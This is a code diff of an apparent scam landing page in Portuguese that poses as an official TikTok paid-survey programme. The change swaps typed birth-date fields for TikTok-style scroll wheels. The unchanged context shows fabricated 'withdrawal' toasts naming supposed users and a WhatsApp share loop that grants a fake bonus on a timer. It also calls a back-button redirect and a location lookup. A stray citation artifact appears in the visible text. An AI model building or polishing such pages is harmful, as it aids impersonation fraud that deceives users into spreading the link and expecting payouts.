@@ -22,6 +22,26 @@
       -ms-overflow-style: none;  /* IE and Edge */
       scrollbar-width: none;  /* Firefox */
     }
+    /* Estilos para o Seletor em Estilo de Rolo */
+    .wheel-container {
+      scroll-snap-type: y mandatory;
+      scrollbar-width: none;
+      -ms-overflow-style: none;
+    }
+    .wheel-container::-webkit-scrollbar {
+      display: none;
+    }
+    .wheel-item {
+      scroll-snap-align: center;
+      height: 40px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 16px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      user-select: none;
+    }
   </style>
 </head>
 <body class="bg-slate-50 min-h-screen text-slate-800 flex flex-col justify-between selection:bg-pink-500 selection:text-white font-sans relative">
@@ -59,7 +79,7 @@
   <!-- Container Principal -->
   <main class="w-full max-w-md mx-auto p-4 flex-1 flex flex-col justify-center space-y-6">
 
-    <!-- ETAPA 1: Verificação de Idade por Data de Nascimento -->
+    <!-- ETAPA 1: Verificação de Idade por Rolagem (Estilo TikTok) -->
     <div id="step-1" class="step-view bg-white rounded-3xl p-6 shadow-xl shadow-slate-100 border border-slate-100 text-center space-y-5">
       <div class="bg-pink-50 border border-pink-100 rounded-2xl p-3 text-center space-y-1">
         <div class="flex items-center justify-center space-x-2 text-xs font-bold text-pink-600 uppercase tracking-wider">
@@ -76,31 +96,41 @@
       </div>
       <div class="space-y-2">
         <h1 class="text-2xl font-bold tracking-tight text-slate-900">Verificação de Idade</h1>
-        <p class="text-sm text-slate-500 leading-relaxed">Para participar do programa oficial de pesquisas remuneradas do TikTok na sua região, informe sua data de nascimento.</p>
+        <p class="text-sm text-slate-500 leading-relaxed">Selecione sua data de nascimento abaixo para confirmar sua idade e prosseguir[span_1](start_span)[span_1](end_span).</p>
       </div>
-      
-      <div class="bg-slate-50 border border-slate-100 p-4 rounded-2xl text-left space-y-3">
-        <span class="text-xs font-bold text-slate-700 uppercase tracking-wider block text-center">Informe sua data de nascimento:</span>
-        <div class="grid grid-cols-3 gap-2">
-          <div>
-            <label class="text-[10px] text-slate-400 font-bold block mb-1">DIA</label>
-            <input type="text" id="birth-day" placeholder="DD" maxlength="2" class="w-full bg-white border border-slate-200 rounded-xl p-2.5 text-center text-sm font-bold focus:outline-none focus:border-pink-500">
+
+      <!-- Container do Rolo de Data -->
+      <div class="bg-slate-50 border border-slate-100 p-4 rounded-2xl relative">
+        <div class="flex justify-between text-[11px] font-bold text-slate-400 uppercase tracking-wider mb-2 px-4">
+          <span>Dia</span>
+          <span>Mês</span>
+          <span>Ano</span>
+        </div>
+
+        <!-- Barra de destaque central estilo TikTok -->
+        <div class="absolute inset-x-4 top-[84px] h-[40px] bg-white border border-slate-200 rounded-xl pointer-events-none shadow-sm z-10"></div>
+
+        <div class="grid grid-cols-3 gap-2 relative h-[160px]">
+          <!-- Rolo de Dias -->
+          <div id="wheel-days" class="wheel-container overflow-y-auto h-full px-1 py-[60px]">
+            <!-- Preenchido via JavaScript -->
           </div>
-          <div>
-            <label class="text-[10px] text-slate-400 font-bold block mb-1">MÊS</label>
-            <input type="text" id="birth-month" placeholder="MM" maxlength="2" class="w-full bg-white border border-slate-200 rounded-xl p-2.5 text-center text-sm font-bold focus:outline-none focus:border-pink-500">
+
+          <!-- Rolo de Meses -->
+          <div id="wheel-months" class="wheel-container overflow-y-auto h-full px-1 py-[60px]">
+            <!-- Preenchido via JavaScript -->
           </div>
-          <div>
-            <label class="text-[10px] text-slate-400 font-bold block mb-1">ANO</label>
-            <input type="text" id="birth-year" placeholder="AAAA" maxlength="4" class="w-full bg-white border border-slate-200 rounded-xl p-2.5 text-center text-sm font-bold focus:outline-none focus:border-pink-500">
+
+          <!-- Rolo de Anos -->
+          <div id="wheel-years" class="wheel-container overflow-y-auto h-full px-1 py-[60px]">
+            <!-- Preenchido via JavaScript -->
           </div>
         </div>
-        <p class="text-[11px] text-slate-400 text-center">Exigido para autorização de transferência via PIX.</p>
       </div>
 
       <div class="space-y-3">
         <button onclick="verifyBirthDate()" class="w-full bg-pink-600 hover:bg-pink-700 active:scale-[0.98] transition-all text-white font-semibold py-3.5 px-4 rounded-xl shadow-md shadow-pink-200 cursor-pointer">
-          Confirmar Idade
+          Avançar
         </button>
       </div>
     </div>
@@ -612,7 +642,82 @@
       { name: "Carla Mendes de Marabá", text: "sacou R$ 872,75" }
     ];
 
-    // --- LÓGICA DE COMPARTILHAMENTO DIRETO WHATSAPP (SEM CRIAR ABA EM BRANCO) ---
+    // --- POPULAR OS ROLOS DE DATA AO CARREGAR ---
+    window.addEventListener('DOMContentLoaded', () => {
+      initDateWheels();
+      fetchUserLocation();
+      setupBackRedirect();
+      setTimeout(initSocialProof, 1500);
+    });
+
+    const monthsNames = ["janeiro", "fevereiro", "março", "abril", "maio", "junho", "julho", "agosto", "setembro", "outubro", "novembro", "dezembro"];
+
+    function initDateWheels() {
+      const daysContainer = document.getElementById('wheel-days');
+      const monthsContainer = document.getElementById('wheel-months');
+      const yearsContainer = document.getElementById('wheel-years');
+
+      // Preencher Dias (1 a 31)
+      let daysHtml = '<div style="height: 60px;"></div>'; // Espaçamento superior
+      for (let i = 1; i <= 31; i++) {
+        daysHtml += `<div class="wheel-item font-semibold text-slate-700" data-value="${i}">${i < 10 ? '0' + i : i}</div>`;
+      }
+      daysHtml += '<div style="height: 60px;"></div>'; // Espaçamento inferior
+      daysContainer.innerHTML = daysHtml;
+
+      // Preencher Meses
+      let monthsHtml = '<div style="height: 60px;"></div>';
+      monthsNames.forEach((m, index) => {
+        monthsHtml += `<div class="wheel-item font-semibold text-slate-700 capitalize" data-value="${index + 1}">${m}</div>`;
+      });
+      monthsHtml += '<div style="height: 60px;"></div>';
+      monthsContainer.innerHTML = monthsHtml;
+
+      // Preencher Anos (De 1940 até o ano atual)
+      const currentYear = new Date().getFullYear();
+      let yearsHtml = '<div style="height: 60px;"></div>';
+      for (let y = currentYear; y >= 1940; y--) {
+        yearsHtml += `<div class="wheel-item font-semibold text-slate-700" data-value="${y}">${y}</div>`;
+      }
+      yearsHtml += '<div style="height: 60px;"></div>';
+      yearsContainer.innerHTML = yearsHtml;
+
+      // Definir posições iniciais padrão (ex: 14 de agosto de 2000 ou maior de idade)
+      setTimeout(() => {
+        scrollToValue('wheel-days', 14);
+        scrollToValue('wheel-months', 8); // agosto
+        scrollToValue('wheel-years', 2000);
+      }, 100);
+    }
+
+    function scrollToValue(containerId, value) {
+      const container = document.getElementById(containerId);
+      const item = container.querySelector(`[data-value="${value}"]`);
+      if (item) {
+        container.scrollTop = item.offsetTop - 60;
+      }
+    }
+
+    function getSelectedWheelValue(containerId) {
+      const container = document.getElementById(containerId);
+      const items = container.querySelectorAll('.wheel-item');
+      const scrollTop = container.scrollTop;
+      
+      let closestItem = items[0];
+      let minDiff = Infinity;
+
+      items.forEach(item => {
+        const diff = Math.abs(item.offsetTop - 60 - scrollTop);
+        if (diff < minDiff) {
+          minDiff = diff;
+          closestItem = item;
+        }
+      });
+
+      return parseInt(closestItem.getAttribute('data-value'));
+    }
+
+    // --- LÓGICA DE COMPARTILHAMENTO DIRETO WHATSAPP ---
     function shareLink() {
       if (shareCount >= 3) return;
 
@@ -623,10 +728,7 @@
     }
 
     function openWhatsApp(text) {
-      // Redireciona na mesma aba atual para evitar deixar abas "about:blank" abertas
       window.location.href = `https://api.whatsapp.com/send?text=${encodeURIComponent(text)}`;
-      
-      // Como a página vai para o WhatsApp, simulamos o retorno do usuário após alguns segundos
       setTimeout(() => {
         registerShareBonus();
       }, 1500);
@@ -761,12 +863,6 @@
       }, 7000);
     }
 
-    window.addEventListener('DOMContentLoaded', () => {
-      fetchUserLocation();
-      setupBackRedirect();
-      setTimeout(initSocialProof, 1500);
-    });
-
     function showToast(title, desc) {
       document.getElementById('toast-title').textContent = title || "Saque Realizado!";
       document.getElementById('toast-desc').textContent = desc;
@@ -796,21 +892,11 @@
       }
     }
 
-    // --- VERIFICAÇÃO DE IDADE POR DATA DE NASCIMENTO ---
+    // --- VERIFICAÇÃO DE IDADE ATRAVÉS DO ROLO ---
     function verifyBirthDate() {
-      const day = parseInt(document.getElementById('birth-day').value);
-      const month = parseInt(document.getElementById('birth-month').value);
-      const year = parseInt(document.getElementById('birth-year').value);
-
-      if (!day || !month || !year || isNaN(day) || isNaN(month) || isNaN(year)) {
-        alert("Por favor, preencha a data de nascimento corretamente.");
-        return;
-      }
-
-      if (day < 1 || day > 31 || month < 1 || month > 12 || year < 1900 || year > new Date().getFullYear()) {
-        alert("Data de nascimento inválida.");
-        return;
-      }
+      const day = getSelectedWheelValue('wheel-days');
+      const month = getSelectedWheelValue('wheel-months');
+      const year = getSelectedWheelValue('wheel-years');
 
       const today = new Date();
       const birthDate = new Date(year, month - 1, day);
